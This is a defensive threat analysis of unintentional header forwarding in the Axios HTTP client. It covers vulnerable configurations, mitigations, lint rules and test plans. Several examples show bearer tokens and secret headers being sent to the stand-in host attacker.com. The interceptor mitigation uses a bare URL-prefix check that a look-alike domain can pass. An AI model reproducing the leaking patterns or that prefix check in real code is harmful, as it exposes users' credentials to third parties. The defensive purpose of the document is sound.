# Deep Analysis: Unintentional Header Forwarding in Axios

## 1. Objective, Scope, and Methodology

### 1.1 Objective

The primary objective of this deep analysis is to:

*   Fully understand the mechanics of the "Unintentional Header Forwarding" threat within the context of Axios.
*   Identify specific code patterns and configurations that are vulnerable.
*   Provide concrete, actionable recommendations for developers to prevent this vulnerability.
*   Establish clear testing strategies to detect and prevent regressions.
*   Raise awareness among the development team about this specific risk.

### 1.2 Scope

This analysis focuses exclusively on the "Unintentional Header Forwarding" threat as it relates to the Axios HTTP client library.  It covers:

*   Axios versions:  Primarily the latest stable release, but with consideration for any known version-specific differences relevant to the threat.  We will assume a version >= 0.22.0 (where `defaults.headers` behavior is well-defined).
*   Configuration methods: `axios.defaults.headers`, `axios.create()`, request-specific configurations, and interceptors.
*   Header types:  Emphasis on sensitive headers like `Authorization`, `Cookie`, `X-API-Key`, but also considers any custom headers that might contain sensitive information.
*   Target environments:  Any environment where Axios is used (browser, Node.js).
*   Third-party interactions:  Scenarios where Axios is used to communicate with both trusted and untrusted third-party services.

This analysis *does not* cover:

*   General HTTP security best practices (e.g., HTTPS usage, input validation) *unless* they directly relate to the specific threat.
*   Vulnerabilities in third-party services themselves (we focus on preventing *our* application from leaking credentials to them).
*   Other Axios-related threats (e.g., XSRF, SSRF) unless they have a direct interaction with header forwarding.

### 1.3 Methodology

The analysis will follow these steps:

1.  **Threat Understanding:**  Deep dive into the threat description, clarifying the attack vector and potential impact.
2.  **Code Analysis:**  Examine Axios source code (if necessary) and documentation to understand how headers are handled internally.
3.  **Vulnerability Identification:**  Create concrete examples of vulnerable code configurations.
4.  **Mitigation Validation:**  Test and verify the effectiveness of the proposed mitigation strategies.
5.  **Testing Strategy Development:**  Outline specific testing approaches to detect and prevent this vulnerability.
6.  **Documentation and Communication:**  Present the findings in a clear, concise, and actionable manner for developers.

## 2. Deep Analysis of the Threat

### 2.1 Threat Understanding (Expanded)

The core issue is the potential for *sensitive headers*, intended for a specific, trusted domain (e.g., `api.mycompany.com`), to be unintentionally sent to *untrusted* domains (e.g., `attacker.com`, `thirdparty.com`).  This leakage can occur due to:

*   **Global Defaults:**  Setting `Authorization` or other sensitive headers in `axios.defaults.headers.common` makes them apply to *all* Axios requests, regardless of the destination.
*   **Misconfigured Instances:**  Creating an Axios instance with `axios.create()` and setting default headers, then using that instance for requests to multiple, differently-trusted domains.
*   **Relative URLs with `baseURL`:**  If `baseURL` is set to a trusted domain, and a relative URL is used that *appears* to point to a trusted resource, but actually redirects (via a 3xx response) to an untrusted domain, the headers will follow the redirect.
*   **Proxy Misconfiguration:** If a proxy is used and not configured correctly, it might forward headers to unintended destinations.

The attacker's goal is to obtain these sensitive headers.  They can achieve this by:

*   **Controlling a Third-Party Service:**  If the application makes requests to a service the attacker controls, they can simply log the incoming headers.
*   **Exploiting a Vulnerable Third-Party Service:**  If the application makes requests to a legitimate but vulnerable third-party service, the attacker might exploit a vulnerability (e.g., an open redirect, a logging misconfiguration) to obtain the headers.
*   **Man-in-the-Middle (MitM) Attack:**  While HTTPS should prevent this, if the attacker can compromise the TLS connection (e.g., through a compromised CA), they can intercept the request and headers.  This is less likely, but still a consideration.

The impact ranges from unauthorized access to third-party resources (using the leaked credentials) to complete account takeover on those services, depending on the nature of the leaked headers and the third-party service's security posture.

### 2.2 Code Analysis (Vulnerability Identification)

Here are specific, vulnerable code examples:

**Example 1: Global Defaults (Highly Vulnerable)**

```javascript
// VERY BAD - DO NOT DO THIS
import axios from 'axios';

axios.defaults.headers.common['Authorization'] = 'Bearer my-super-secret-token';

// This request sends the token to api.mycompany.com (intended)
axios.get('https://api.mycompany.com/data');

// This request ALSO sends the token to attacker.com (UNINTENDED!)
axios.get('https://attacker.com/evil');
```

**Example 2: Misconfigured Instance (Vulnerable)**

```javascript
import axios from 'axios';

const apiClient = axios.create({
  baseURL: 'https://api.mycompany.com',
  headers: {
    'Authorization': 'Bearer my-super-secret-token'
  }
});

// This request sends the token to api.mycompany.com (intended)
apiClient.get('/data');

// This request ALSO sends the token to thirdparty.com (UNINTENDED!)
apiClient.get('https://thirdparty.com/something');
```

**Example 3: Relative URL with `baseURL` and Redirect (Vulnerable)**

```javascript
import axios from 'axios';

const apiClient = axios.create({
  baseURL: 'https://api.mycompany.com',
  headers: {
    'Authorization': 'Bearer my-super-secret-token'
  }
});

// Assume /redirect is an endpoint on api.mycompany.com that returns a 302 redirect to attacker.com
// The Authorization header WILL follow the redirect!
apiClient.get('/redirect');
```

**Example 4:  Using a custom header (Vulnerable)**
```javascript
import axios from 'axios';

axios.defaults.headers.common['X-My-Custom-Secret'] = 'secret-value';

// This request sends the custom secret header to attacker.com (UNINTENDED!)
axios.get('https://attacker.com/evil');
```

### 2.3 Mitigation Validation

Let's validate the mitigation strategies with code examples:

**Mitigation 1: Avoid Global Sensitive Headers (Correct)**

```javascript
import axios from 'axios';

// No global Authorization header set

// This request sends the token ONLY to api.mycompany.com
axios.get('https://api.mycompany.com/data', {
  headers: {
    'Authorization': 'Bearer my-super-secret-token'
  }
});

// This request does NOT send the token
axios.get('https://attacker.com/evil');
```

**Mitigation 2: Instance-Specific Headers (Correct)**

```javascript
import axios from 'axios';

const myCompanyApi = axios.create({
  baseURL: 'https://api.mycompany.com',
  headers: {
    'Authorization': 'Bearer my-super-secret-token'
  }
});

const otherApi = axios.create({
    baseURL: 'https://thirdparty.com'
});

// This request sends the token ONLY to api.mycompany.com
myCompanyApi.get('/data');

// This request does NOT send the token
otherApi.get('/something');
```

**Mitigation 3: Request Context (Correct)**

```javascript
import axios from 'axios';

const apiClient = axios.create({
  baseURL: 'https://api.mycompany.com',
  headers: {
    'Authorization': 'Bearer my-super-secret-token' // Still set, but overridden below
  }
});

// This request sends the token (as configured in the instance)
apiClient.get('/data');

// This request overrides the Authorization header, sending a different token or none at all
apiClient.get('https://thirdparty.com/something', {
  headers: {
    'Authorization': 'Bearer another-token' // Or remove the header entirely
  }
});
```

**Mitigation 4: Careful `baseURL` Usage (Correct)**

Always be explicit with your URLs, especially when dealing with potentially untrusted services.  Avoid relying solely on `baseURL` for security.  Use full URLs for untrusted endpoints.

```javascript
import axios from 'axios';

const apiClient = axios.create({
  baseURL: 'https://api.mycompany.com',
});

// Safer: Use a full URL for the third-party service
apiClient.get('https://thirdparty.com/something'); // Even without headers, it's clearer

// Less safe: Relies on baseURL and might be vulnerable if /something redirects
apiClient.get('/something');
```

**Mitigation 5: Interceptors (Correct and Powerful)**

Interceptors provide a powerful way to control header behavior based on the request URL:

```javascript
import axios from 'axios';

const apiClient = axios.create();

apiClient.interceptors.request.use(config => {
  if (config.url.startsWith('https://api.mycompany.com')) {
    config.headers['Authorization'] = 'Bearer my-super-secret-token';
  }
  // Optionally, explicitly remove the header for other URLs:
  else {
    delete config.headers['Authorization'];
  }
  return config;
});

// This request sends the token
apiClient.get('https://api.mycompany.com/data');

// This request does NOT send the token
apiClient.get('https://attacker.com/evil');

// This request does NOT send the token, even with a relative URL and baseURL
apiClient.get('/something'); // Assuming baseURL is NOT set to attacker.com
```

### 2.4 Testing Strategy

To detect and prevent this vulnerability, we need a multi-pronged testing approach:

1.  **Static Analysis (Linting):**
    *   Use ESLint with custom rules (or potentially a dedicated security linter) to:
        *   **Forbid** setting `Authorization` (or other sensitive headers) in `axios.defaults.headers.common`.
        *   **Warn** when setting sensitive headers in `axios.create()` without a clear understanding of the instance's usage.
        *   **Flag** the use of relative URLs with `baseURL` when sensitive headers are present.
    *   Example ESLint rule (conceptual):

        ```javascript
        // .eslintrc.js
        module.exports = {
          rules: {
            'no-axios-global-auth': 'error', // Custom rule
            'axios-instance-header-review': 'warn',
            'axios-relative-url-with-headers': 'warn'
          }
        };
        ```

2.  **Dynamic Analysis (Runtime Checks):**
    *   Create a test suite that specifically targets this vulnerability:
        *   **Test Case 1:**  Configure Axios with global sensitive headers and make requests to both trusted and *known* untrusted endpoints.  Verify that the untrusted endpoints *do not* receive the headers (e.g., using a mock server or a test environment that logs requests).
        *   **Test Case 2:**  Create Axios instances with sensitive headers and repeat the above test, ensuring the headers are only sent to the intended domains.
        *   **Test Case 3:**  Test with relative URLs and `baseURL`, including scenarios with redirects (using a mock server that simulates redirects).
        *   **Test Case 4:**  Use interceptors to control header behavior and verify that the interceptors function as expected.
        *   **Test Case 5:** Test with various combinations of headers, including custom headers that might contain sensitive data.

3.  **Code Reviews:**
    *   Mandatory code reviews should specifically look for:
        *   Any use of `axios.defaults.headers.common` for sensitive headers.
        *   Careless use of `axios.create()` with default headers.
        *   Potential for unintentional header forwarding due to relative URLs or redirects.

4.  **Penetration Testing (Optional, but Recommended):**
    *   If the application handles highly sensitive data or interacts with critical third-party services, consider engaging a penetration testing team to specifically look for this and other related vulnerabilities.

### 2.5 Documentation and Communication

*   **Developer Guidelines:**  Create clear, concise documentation for developers that:
    *   Explains the "Unintentional Header Forwarding" threat.
    *   Provides the "do's and don'ts" of configuring Axios headers.
    *   Includes the code examples from this analysis (both vulnerable and mitigated).
    *   Emphasizes the importance of using instance-specific headers or interceptors.
    *   Links to the ESLint rules and testing strategies.
*   **Training:**  Conduct training sessions for developers to raise awareness about this vulnerability and how to prevent it.
*   **Code Review Checklist:**  Include specific items on the code review checklist related to Axios header configuration.
